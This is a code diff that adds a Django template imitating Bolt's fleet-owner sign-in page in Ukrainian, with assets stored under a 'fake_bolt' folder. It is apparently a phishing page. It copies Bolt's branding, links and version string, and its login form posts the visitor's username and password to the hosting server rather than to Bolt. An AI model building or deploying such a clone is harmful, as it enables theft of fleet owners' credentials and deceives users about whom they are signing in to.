@@ -1,0 +1,104 @@
+<!--
+=======================================================
+         ___       _         ___       _    _
+        |_  |     (_)       |   \     | | _| |_
+          | | ___  _ _ __   |   / ___ | ||_   _|
+          | |/ _ \| | '_ \  |  | / _ \| |  | |
+      /\__/ / (_) | | | | | |   \ (_) | |  | |
+      \____/ \___/|_|_| |_| |___/\___/|_|   \_\
+
+     Let's build the future of transport together.
+
+              https://careers.bolt.eu/
+
+=======================================================
+-->
+<!DOCTYPE html>
+{% load static %}
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Sign Up as a Fleet Owner | Bolt</title>
+    <meta name="description" content="If you have access to multiple vehicles and want to run your business more efficiently, join Bolt as a fleet owner and start making extra money today!">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="facebook-domain-verification" content="sjr5kea3y9psahfx3saec2m7h9150m" />
+    <meta property="og:title" content="Sign Up as a Fleet Owner | Bolt" />
+    <meta property="og:image" content="https://fleets.bolt.eu/v3.61.0/assets/img/fleet-og-ded6a566691dbab403b8c993dd40e609.jpg" />
+
+
+
+    <link integrity="" rel="stylesheet" href="{% static 'fake_bolt/css/vendor.css' %}">
+    <link integrity="" rel="stylesheet" href="{% static 'fake_bolt/css/fleet-owner.css' %}">
+    <link rel="shortcut icon" href="{% static 'fake_bolt/images/favicon-bolt.ico' %}" />
+</head>
+
+<body>
+<div id="ember3" class="container ember-view">
+   <div class="row">
+      <!---->
+      <div class="col-sm-4 col-sm-offset-4">
+         <p class="text-center">
+            <a href="https://fleets.bolt.eu/signup" id="ember4" class="ember-view">
+               <img src="{% static 'fake_bolt/images/logo-bolt.svg' %}" class="w-lg cursor-pointer" alt="Зареєструватися, як власник автопарку | Bolt">
+            </a>
+         </p>
+         <div class="hr-divider m-y">
+            <h3 class="hr-divider-content hr-divider-heading">
+               Увійти
+            </h3>
+         </div>
+         {% if messages %}
+         {% for msg in messages %}
+         <div class="alert alert-warning">
+           {{ msg }}
+         </div>
+         {% endfor %}
+         {% endif %}
+         <!---->
+         <form method="POST">
+            {% csrf_token %}
+            <div id="ember5" class="form-group form-group-lg ember-view">
+                <label for="username">Ім'я користувача</label>
+               <input placeholder="Введіть ім`я користувача" autofocus="" name="Username" id="username" class="form-control ember-text-field ember-view" type="text">
+            </div>
+            <div id="ember6" class="form-group form-group-lg ember-view">
+                <label for="password">Пароль</label>
+               <input id="password" class="form-control ember-text-field ember-view" name="Password" type="password">
+            </div>
+            <button id="ember7" class="btn btn-success btn-lg btn-block ember-view" type="submit">        Увійти
+            →
+            </button>      <a href="https://fleets.bolt.eu/forgot-password" id="ember8" class="btn btn-link btn-block btn-lg ember-view">Забули пароль??</a>
+         </form>
+         <hr>
+         <p class="text-center">Не є керуючим автопарку у Bolt? <a href="https://fleets.bolt.eu/signup" id="ember9" class="ember-view">Зареєструйтеся тут</a>.</p>
+         <div class="text-center m-t">
+            <div id="ember10" class="btn-group ember-view">
+               <span id="ember11" class="ember-view">
+                  <div class="ember-basic-dropdown btn-group bootstrap-select form-control">
+                     <div id="ember14" class="ember-view ember-basic-dropdown-trigger ember-basic-dropdown-trigger--in-place btn dropdown-toggle  btn-default" role="button" tabindex="0" data-ebd-id="ember12-trigger" aria-owns="ember-basic-dropdown-content-ember12" aria-expanded="false">
+                        <span>
+                        <span class="filter-option pull-left" data-test-select-picker="trigger-content">
+                        <span class="icon icon-globe"></span> Українська
+                        </span>
+                        &nbsp;
+                        <span class="bs-caret">
+                            <span class="caret"></span>
+                        </span>
+                        </span>
+                     </div>
+                     <div id="ember-basic-dropdown-content-ember12" class="ember-basic-dropdown-content-placeholder" style="display: none;"></div>
+                  </div>
+               </span>
+            </div>
+         </div>
+      </div>
+   </div>
+</div>
+<div class="app-version hidden-xs">
+   3.61.0+21bf17de
+</div>
+</body>
+
+</html>
